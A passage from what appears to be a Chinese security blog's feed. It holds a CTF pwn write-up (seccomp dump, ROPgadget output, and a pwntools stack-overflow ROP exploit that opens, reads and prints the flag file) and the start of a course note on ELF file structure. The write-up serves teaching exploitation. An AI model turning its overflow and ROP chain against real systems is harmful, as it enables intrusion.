class=\"number\">0</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;read error&quot;</span>);</span><br><span class=\"line\">    _exit(<span class=\"number\">1</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> write(<span class=\"number\">1</span>, s, <span class=\"number\">0x1000</span>uLL);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"检查安全措施\"><a href=\"#检查安全措施\" class=\"headerlink\" title=\"检查安全措施\"></a>检查安全措施</h2><p>​\t\tinstall_seccomp、</p>\n<p>​\t\t看到这个函数就知道有seccomp保护措施,限制了一些系统调用的使用,于是使用工具进行检查,</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@VM<span class=\"number\">-24</span><span class=\"number\">-10</span>-ubuntu:/tmp<span class=\"meta\"># seccomp-tools dump ./rop</span></span><br><span class=\"line\"> line  CODE  JT   JF      K</span><br><span class=\"line\">=================================</span><br><span class=\"line\"> <span class=\"number\">0000</span>: <span class=\"number\">0x20</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00000004</span>  A = arch</span><br><span class=\"line\"> <span class=\"number\">0001</span>: <span class=\"number\">0x15</span> <span class=\"number\">0x00</span> <span class=\"number\">0x0c</span> <span class=\"number\">0xc000003e</span>  <span class=\"keyword\">if</span> (A != ARCH_X86_64) <span class=\"keyword\">goto</span> <span class=\"number\">0014</span></span><br><span class=\"line\"> <span class=\"number\">0002</span>: <span class=\"number\">0x20</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00000000</span>  A = sys_number</span><br><span class=\"line\"> <span class=\"number\">0003</span>: <span class=\"number\">0x35</span> <span class=\"number\">0x0a</span> <span class=\"number\">0x00</span> <span class=\"number\">0x40000000</span>  <span class=\"keyword\">if</span> (A &gt;= <span class=\"number\">0x40000000</span>) <span class=\"keyword\">goto</span> <span class=\"number\">0014</span></span><br><span class=\"line\"> <span class=\"number\">0004</span>: <span class=\"number\">0x15</span> <span class=\"number\">0x08</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00000002</span>  <span class=\"keyword\">if</span> (A == open) <span class=\"keyword\">goto</span> <span class=\"number\">0013</span></span><br><span class=\"line\"> <span class=\"number\">0005</span>: <span class=\"number\">0x15</span> <span class=\"number\">0x07</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00000101</span>  <span class=\"keyword\">if</span> (A == openat) <span class=\"keyword\">goto</span> <span class=\"number\">0013</span></span><br><span class=\"line\"> <span class=\"number\">0006</span>: <span class=\"number\">0x15</span> <span class=\"number\">0x06</span> <span class=\"number\">0x00</span> <span class=\"number\">0x000001b5</span>  <span class=\"keyword\">if</span> (A == <span class=\"number\">0x1b5</span>) <span class=\"keyword\">goto</span> <span class=\"number\">0013</span></span><br><span class=\"line\"> <span class=\"number\">0007</span>: <span class=\"number\">0x15</span> <span class=\"number\">0x05</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00000000</span>  <span class=\"keyword\">if</span> (A == read) <span class=\"keyword\">goto</span> <span class=\"number\">0013</span></span><br><span class=\"line\"> <span class=\"number\">0008</span>: <span class=\"number\">0x15</span> <span class=\"number\">0x04</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00000001</span>  <span class=\"keyword\">if</span> (A == write) <span class=\"keyword\">goto</span> <span class=\"number\">0013</span></span><br><span class=\"line\"> <span class=\"number\">0009</span>: <span class=\"number\">0x15</span> <span class=\"number\">0x03</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00000003</span>  <span class=\"keyword\">if</span> (A == close) <span class=\"keyword\">goto</span> <span class=\"number\">0013</span></span><br><span class=\"line\"> <span class=\"number\">0010</span>: <span class=\"number\">0x15</span> <span class=\"number\">0x02</span> <span class=\"number\">0x00</span> <span class=\"number\">0x0000003c</span>  <span class=\"keyword\">if</span> (A == <span class=\"built_in\">exit</span>) <span class=\"keyword\">goto</span> <span class=\"number\">0013</span></span><br><span class=\"line\"> <span class=\"number\">0011</span>: <span class=\"number\">0x15</span> <span class=\"number\">0x01</span> <span class=\"number\">0x00</span> <span class=\"number\">0x000000e7</span>  <span class=\"keyword\">if</span> (A == exit_group) <span class=\"keyword\">goto</span> <span class=\"number\">0013</span></span><br><span class=\"line\"> <span class=\"number\">0012</span>: <span class=\"number\">0x06</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00050005</span>  <span class=\"keyword\">return</span> ERRNO(<span class=\"number\">5</span>)</span><br><span class=\"line\"> <span class=\"number\">0013</span>: <span class=\"number\">0x06</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00</span> <span class=\"number\">0x7fff0000</span>  <span class=\"keyword\">return</span> ALLOW</span><br><span class=\"line\"> <span class=\"number\">0014</span>: <span class=\"number\">0x06</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00000000</span>  <span class=\"keyword\">return</span> KILL</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t能够看到只允许用open read write这几个,一般来说pwn题是要拿到权限的,但是根本目的是拿到flag,所以即便拿不到shell,也可以利用这几个函数调用来读取和打印flag</p>\n<h1 id=\"解题步骤\"><a href=\"#解题步骤\" class=\"headerlink\" title=\"解题步骤\"></a>解题步骤</h1><h2 id=\"寻找gadget\"><a href=\"#寻找gadget\" class=\"headerlink\" title=\"寻找gadget\"></a>寻找gadget</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@VM<span class=\"number\">-24</span><span class=\"number\">-10</span>-ubuntu:/tmp# ROPgadget --binary rop  --only <span class=\"string\">&#x27;pop|ret&#x27;</span>  </span><br><span class=\"line\">Gadgets information</span><br><span class=\"line\">============================================================</span><br><span class=\"line\"><span class=\"number\">0x00000000004014fc</span> : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\"><span class=\"number\">0x00000000004014fe</span> : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\"><span class=\"number\">0x0000000000401500</span> : pop r14 ; pop r15 ; ret</span><br><span class=\"line\"><span class=\"number\">0x0000000000401502</span> : pop r15 ; ret</span><br><span class=\"line\"><span class=\"number\">0x00000000004014fb</span> : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\"><span class=\"number\">0x00000000004014ff</span> : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\"><span class=\"number\">0x000000000040121d</span> : pop rbp ; ret</span><br><span class=\"line\"><span class=\"number\">0x0000000000401503</span> : pop rdi ; ret</span><br><span class=\"line\"><span class=\"number\">0x0000000000401501</span> : pop rsi ; pop r15 ; ret</span><br><span class=\"line\"><span class=\"number\">0x00000000004014fd</span> : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\"><span class=\"number\">0x000000000040101a</span> : ret</span><br><span class=\"line\"><span class=\"number\">0x0000000000401297</span> : ret <span class=\"number\">0x2be</span></span><br><span class=\"line\"></span><br><span class=\"line\">Unique gadgets found: <span class=\"number\">12</span></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t根据调用约定,rdi rsi rdx是函数的前三个参数,但是没有找到pop rdx的gadget. ret2csu方法里是可以间接修改rdx的,<font color=\"red\">不过事实上,这道题不需要管第三个参数,具体原因还未知.</font></p>\n<h2 id=\"布局函数\"><a href=\"#布局函数\" class=\"headerlink\" title=\"布局函数\"></a>布局函数</h2><p>​\t\t这里有一个很重要的问题,就是二进制文件中不存在flag这四个字符,因为后面读取flag,需要用到这个字符串,所以需要先获取这四个字符. 获取之后利用传统的orw来进行打开,读取和写出flag.</p>\n<p>open(’文件名‘,0,0)  </p>\n<p>read(文件描述符,‘文件名’,读取大小)   read比较特殊, 第一个文件描述符 0标准输入(从用户输入获取值) 1 标准输出,2标准错误 345..就是文件描述符了,当第一个参数是0的时候,第二个参数就不是文件名了,而是要写入的内存地址</p>\n<p>write(1，‘文件名’，写大小)</p>\n<p>​\t\t所以分了四个步骤,如下</p>\n<ul>\n<li><p>read(0,写入的内存地址,0x30)\t</p>\n</li>\n<li><p>open(‘flag’,0,0)</p>\n</li>\n<li><p>read(3,‘flag’,0x30) 从打开的文件中读取</p>\n</li>\n<li><p>write(1,‘flag’,0x30) 标准输出</p>\n</li>\n</ul>\n<h2 id=\"编写payload\"><a href=\"#编写payload\" class=\"headerlink\" title=\"编写payload\"></a>编写payload</h2><p>​\t\t256溢出+8字节rbp,然后就是返回地址了,构造rop链,下面四行分别对应着上面的四步</p>\n<p>​\t\tpoprsi的话,没有单独的 ,只有 0x0000000000401501 : pop rsi ; pop r15 ; ret, 所以在它后面再加一个垃圾数据.上面说过,没有pop rdx,所以我们只需要控制前两个参数即可</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload = <span class=\"string\">&quot;a&quot;</span>*<span class=\"number\">264</span> + p64(poprdi) + p64(<span class=\"string\">&quot;0&quot;</span>) + p64(poprsi)+ p64(bssaddr) +p64(<span class=\"number\">0</span>)+ p64(readaddr) </span><br><span class=\"line\">payload += p64(poprdi) +  p64(bssaddr) + p64(poprsi) + p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0</span>)+p64(openaddr)</span><br><span class=\"line\">payload += p64(poprdi) + p64(<span class=\"number\">3</span>) + p64(poprsi) + p64(bssaddr) +p64(<span class=\"number\">0</span>)+ p64(readaddr)</span><br><span class=\"line\">payload += p64(poprdi) + p64(<span class=\"number\">1</span>) + p64(poprsi) + p64(bssaddr) +p64(<span class=\"number\">0</span>) +p64(writeaddr)</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t但是这里还有问题,就是payload的长度太长,溢出只有0x150 - 256 - 8  &#x3D;72字节,是不够用的,所以这里需要再进行调整,有两个办法,一个是可以多次溢出,四步可以分四步来进行,每完成一步,再跳回到vul函数开头,重新溢出执行下一步,第二个办法是进行栈迁移,把栈移到更大的空间去</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload = <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">264</span> + p64(poprdi) + p64(<span class=\"number\">0</span>) + p64(poprsi)+ p64(bssaddr) +p64(<span class=\"number\">0</span>)+ p64(readaddr)+p64(vuladdr)</span><br><span class=\"line\">payload1 = <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">264</span>+p64(poprdi) +  p64(bssaddr) + p64(poprsi) + p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0</span>)+p64(openaddr)+p64(vuladdr)</span><br><span class=\"line\">payload2 = <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">264</span>+p64(poprdi) + p64(<span class=\"number\">3</span>) + p64(poprsi) + p64(bssaddr) +p64(<span class=\"number\">0</span>)+ p64(readaddr)+p64(vuladdr)</span><br><span class=\"line\">payload3 = <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">264</span>+p64(poprdi) + p64(<span class=\"number\">1</span>) + p64(poprsi) + p64(bssaddr) +p64(<span class=\"number\">0</span>) +p64(writeaddr)+p64(vuladdr)</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t分四次发送即可,每次在最后跳回vul函数开头</p>\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\">sh = remote(<span class=\"string\">&quot;xxx&quot;</span>,xxx)</span><br><span class=\"line\"><span class=\"comment\">#sh = process(&quot;./rop&quot;)</span></span><br><span class=\"line\">context.log_level= <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"><span class=\"comment\">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(sh,&quot;b *0x000004013AE&quot;)</span></span><br><span class=\"line\"></span><br><span class=\"line\">poprdi = <span class=\"number\">0x0000000000401503</span></span><br><span class=\"line\">poprsi = <span class=\"number\">0x0000000000401501</span></span><br><span class=\"line\">popr13 = <span class=\"number\">0x00000000004014fe</span></span><br><span class=\"line\">scanfaddr = <span class=\"number\">0x0000000000401451</span></span><br><span class=\"line\">bssaddr = <span class=\"number\">0x0000404100</span> + <span class=\"number\">0x100</span></span><br><span class=\"line\">readaddr = <span class=\"number\">0x000000401100</span></span><br><span class=\"line\">openaddr = <span class=\"number\">0x00000004012C9</span></span><br><span class=\"line\">writeaddr = <span class=\"number\">0x000000004010E0</span></span><br><span class=\"line\">start = <span class=\"number\">0x000401432</span></span><br><span class=\"line\">vuladdr = <span class=\"number\">0x0000000401384</span></span><br><span class=\"line\">payload = <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">264</span> + p64(poprdi) + p64(<span class=\"number\">0</span>) + p64(poprsi)+ p64(bssaddr) +p64(<span class=\"number\">0</span>)+ p64(readaddr)+p64(vuladdr)</span><br><span class=\"line\">payload1 = <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">264</span>+p64(poprdi) +  p64(bssaddr) + p64(poprsi) + p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0</span>)+p64(openaddr)+p64(vuladdr)</span><br><span class=\"line\">payload2 = <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">264</span>+p64(poprdi) + p64(<span class=\"number\">3</span>) + p64(poprsi) + p64(bssaddr) +p64(<span class=\"number\">0</span>)+ p64(readaddr)+p64(vuladdr)</span><br><span class=\"line\">payload3 = <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">264</span>+p64(poprdi) + p64(<span class=\"number\">1</span>) + p64(poprsi) + p64(bssaddr) +p64(<span class=\"number\">0</span>) +p64(writeaddr)+p64(vuladdr)</span><br><span class=\"line\"><span class=\"comment\">#input()</span></span><br><span class=\"line\">sh.sendlineafter(<span class=\"string\">&quot;choice:&quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">4919</span>))</span><br><span class=\"line\">sh.sendline(payload)</span><br><span class=\"line\">sh.send(<span class=\"string\">&quot;flag&quot;</span>) <span class=\"comment\">#  不能用sendline 会有\\n</span></span><br><span class=\"line\">sh.sendline(payload1)</span><br><span class=\"line\">sh.sendline(payload2)</span><br><span class=\"line\">sh.sendline(payload3)</span><br><span class=\"line\">sh.recv(<span class=\"number\">1024</span>)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"细节注意\"><a href=\"#细节注意\" class=\"headerlink\" title=\"细节注意\"></a>细节注意</h1><h2 id=\"open-write-read函数选择\"><a href=\"#open-write-read函数选择\" class=\"headerlink\" title=\"open write read函数选择\"></a>open write read函数选择</h2><p>​\t\t一开始选的是 .text:0000000000401313 E8 B1 FF FF FF call sys_open ,这肯定是不对的,因为这里的话,控制流到了这里,执行完call没有ret会继续往下执行,就乱套了,</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:000000000040130C                 lea     rdi, aGiftsTxt  ; &quot;./gifts.txt&quot;</span><br><span class=\"line\">.text:0000000000401313                 call    sys_open</span><br><span class=\"line\">.text:0000000000401318                 mov     [rbp+fd], eax</span><br><span class=\"line\">.text:000000000040131B                 lea     rax, [rbp+s]</span><br><span class=\"line\">.text:0000000000401322                 mov     edx, 1000h      ; n</span><br><span class=\"line\">.text:0000000000401327                 mov     esi, 0          ; c</span><br><span class=\"line\">.text:000000000040132C                 mov     rdi, rax        ; s</span><br><span class=\"line\">.text:000000000040132F                 call    _memset</span><br><span class=\"line\">.text:0000000000401334                 lea     rcx, [rbp+s]</span><br><span class=\"line\">.text:000000000040133B                 mov     eax, [rbp+fd]</span><br><span class=\"line\">.text:000000000040133E                 mov     edx, 1000h      ; nbytes</span><br><span class=\"line\">.text:0000000000401343                 mov     rsi, rcx        ; buf</span><br><span class=\"line\">.text:0000000000401346                 mov     edi, eax        ; fd</span><br><span class=\"line\">.text:0000000000401348                 call    _read</span><br><span class=\"line\">.text:000000000040134D                 test    rax, rax</span><br><span class=\"line\">.text:0000000000401350                 jns     short loc_401368</span><br><span class=\"line\">.text:0000000000401352                 lea     rdi, aReadError ; &quot;read error&quot;</span><br><span class=\"line\">.text:0000000000401359                 call    _puts</span><br><span class=\"line\">.text:000000000040135E                 mov     edi, 1          ; status</span><br><span class=\"line\">.text:0000000000401363                 call    __exit</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t应该调用plt这个,这个调用完之后会ret返回</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.plt.sec:0000000000401100 _read           proc near               ; CODE XREF: some_gifts+59↓p</span><br><span class=\"line\">.plt.sec:0000000000401100                                         ; vuln+23↓p</span><br><span class=\"line\">.plt.sec:0000000000401100                 endbr64</span><br><span class=\"line\">.plt.sec:0000000000401104                 bnd jmp cs:off_404038</span><br><span class=\"line\">.plt.sec:0000000000401104 _read           endp</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"send、sendline\"><a href=\"#send、sendline\" class=\"headerlink\" title=\"send、sendline\"></a>send、sendline</h2><p>​\t\tsh.send(“flag”) #  不能用sendline 会有\\n  第一次read读取flag文件名的时候,不能用sendline,否则会有个回车,就不是正确的文件名了</p>\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%8F%91%E7%8E%B0-elf%E5%88%86%E6%9E%90%E4%B8%8E%E8%A7%A3%E6%9E%90%E5%AE%9E%E7%8E%B0/",
            "url": "https://tangzichengcc.github.io/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%8F%91%E7%8E%B0-elf%E5%88%86%E6%9E%90%E4%B8%8E%E8%A7%A3%E6%9E%90%E5%AE%9E%E7%8E%B0/",
            "title": "ucas-软件安全漏洞分析与发现-elf分析与解析实现",
            "date_published": "2023-03-14T01:26:04.000Z",
            "content_html": "<p><img src=\"/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%8F%91%E7%8E%B0-elf%E5%88%86%E6%9E%90%E4%B8%8E%E8%A7%A3%E6%9E%90%E5%AE%9E%E7%8E%B0/image-20230314100936800.png\" alt=\"image-20230314100936800\"></p>\n<h1 id=\"一、基础\"><a href=\"#一、基础\" class=\"headerlink\" title=\"一、基础\"></a>一、基础</h1><h2 id=\"ELF文件-整体架构\"><a href=\"#ELF文件-整体架构\" class=\"headerlink\" title=\"ELF文件 整体架构\"></a>ELF文件 整体架构</h2><p>​\telf文件主要分了几部分:头部、程序头、节表头以及各种节.</p>\n<p>​\telf头部中存储了程序头和节表头的位置,节头中又存储了各个节的位置,以此进行索引.</p>\n<p>​\t所以可以回答第2个问题的一部分, 这些节(我认为题目应该说的是节的意思, 段和节经常混用) 在ELF中的位置是可以任意调换的,因为在头部中指定了它们的位置,只要索引信息没问题就可以.</p>\n<p><a href=\"https://img-blog.csdnimg.cn/b285b3b11743431d8141594ad4b3f8de.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LiN5Lya5YaZ5Luj56CB55qE5Lid5Li9,size_20,color_FFFFFF,t_70,g_se,x_16\"><img src=\"/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%8F%91%E7%8E%B0-elf%E5%88%86%E6%9E%90%E4%B8%8E%E8%A7%A3%E6%9E%90%E5%AE%9E%E7%8E%B0/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LiN5Lya5YaZ5Luj56CB55qE5Lid5Li9,size_20,color_FFFFFF,t_70,g_se,x_16.png\" alt=\"img\"></a></p>\n<h2 id=\"链接视图与执行时视图\"><a href=\"#链接视图与执行时视图\" class=\"headerlink\" title=\"链接视图与执行时视图\"></a>链接视图与执行时视图</h2><p>​\t\telf静态文件是链接视图,当加载到内存后,会有些许变化.</p>\n<p><img src=\"/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%8F%91%E7%8E%B0-elf%E5%88%86%E6%9E%90%E4%B8%8E%E8%A7%A3%E6%9E%90%E5%AE%9E%E7%8E%B0/image-20230322090941304.png\" alt=\"image-20230322090941304\"></p>\n<p>​\t\t在链接视图中,节表是必须的,需要根据它来定位各个节,以及保存节的属性,而程序头表则是可选的,程序头表的内容是加载进内存后的属性(<font color=\"red\">是否可选要看该文件的类型??</font>).</p>\n<p>​\t\t在执行视图中,程序头表是必须的,节表就是可选的了.</p>\n<p>​\t\t在静态文件中,有各种不一样的程序的节(section),比如.text节 .bss节,在加载进内存后,<code>加载器</code>会将相同的节属性（比如只读）合并一个段(segment)</p>\n<h2 id=\"ELF文件头-ehdr\"><a href=\"#ELF文件头-ehdr\" class=\"headerlink\" title=\"ELF文件头 ehdr\"></a>ELF文件头 ehdr</h2><p>​\t\t详细内容:<a href=\"https://refspecs.linuxfoundation.org/elf/gabi4+/ch4.eheader.html\">https://refspecs.linuxfoundation.org/elf/gabi4+/ch4.eheader.html</a></p>\n<p>​\t\t结构体定义如下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#define EI_NIDENT 16</span><br><span class=\"line\"></span><br><span class=\"line\">typedef struct &#123;</span><br><span class=\"line\">        unsigned char   e_ident[EI_NIDENT];</span><br><span class=\"line\">        Elf32_Half      e_type;</span><br><span class=\"line\">        Elf32_Half      e_machine;</span><br><span class=\"line\">        Elf32_Word      e_version;</span><br><span class=\"line\">        Elf32_Addr      e_entry;</span><br><span class=\"line\">        Elf32_Off       e_phoff;</span><br><span class=\"line\">        Elf32_Off       e_shoff;</span><br><span class=\"line\">        Elf32_Word      e_flags;</span><br><span class=\"line\">        Elf32_Half      e_ehsize;</span><br><span class=\"line\">        Elf32_Half      e_phentsize;</span><br><span class=\"line\">        Elf32_Half      e_phnum;</span><br><span class=\"line\">        Elf32_Half      e_shentsize;</span><br><span class=\"line\">        Elf32_Half      e_shnum;</span><br><span class=\"line\">        Elf32_Half      e_shstrndx;</span><br><span class=\"line\">&#125; Elf32_Ehdr;</span><br><span class=\"line\"></span><br><span class=\"line\">typedef struct</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  unsigned char\te_ident[EI_NIDENT];\t/* Magic number and other info */</span><br><span class=\"line\">  Elf64_Half\te_type;\t\t\t/* Object file type */ elf文件类型</span><br><span class=\"line\">  Elf64_Half\te_machine;\t\t/* Architecture */    CPU架构</span><br><span class=\"line\">  Elf64_Word\te_version;\t\t/* Object file version */  指定ELF版本,一般都为1</span><br><span class=\"line\">  Elf64_Addr\te_entry;\t\t/* Entry point virtual address */  代码运行的入口</span><br><span class=\"line\">  Elf64_Off\te_phoff;\t\t/* Program header table file offset */  程序头表在文件中的偏移</span><br><span class=\"line\">  Elf64_Off\te_shoff;\t\t/* Section header table file offset */\t节头表在文件中的偏移</span><br><span class=\"line\">  Elf64_Word\te_flags;\t\t/* Processor-specific flags */\t在e_machine指定的处理器下的一些特性</span><br><span class=\"line\">  Elf64_Half\te_ehsize;\t\t/* ELF header size in bytes */</span><br><span class=\"line\">  Elf64_Half\te_phentsize;\t\t/* Program header table entry size */\t程序头表每个条目的大小</span><br><span class=\"line\">  Elf64_Half\te_phnum;\t\t/* Program header table entry count */\t\t程序头表中条目的树木</span><br><span class=\"line\">  Elf64_Half\te_shentsize;\t\t/* Section header table entry size */\t节头表每个条目的大小</span><br><span class=\"line\">  Elf64_Half\te_shnum;\t\t/* Section header table entry count */\t\t节头表中条目的数量</span><br><span class=\"line\">  Elf64_Half\te_shstrndx;\t\t/* Section header string table index */  每个节都有一个名称,这些名称存储在.shstrtab节中,e_shstrndx指定这个特殊的节所在节头表的下表</span><br><span class=\"line\">&#125; Elf64_Ehdr;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t可以用010editor加载插件后清晰的看到结构(需要在templates里面安装和加载一下elf模版)</p>\n<p><img src=\"/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%8F%91%E7%8E%B0-elf%E5%88%86%E6%9E%90%E4%B8%8E%E8%A7%A3%E6%9E%90%E5%AE%9E%E7%8E%B0/image-20230322094455562.png\" alt=\"image-20230322094455562\"></p>\n<h3 id=\"e-ident\"><a href=\"#e-ident\" class=\"headerlink\" title=\"e_ident\"></a>e_ident</h3><p>​\t\t一个16字节大小的数组</p>\n<p><img 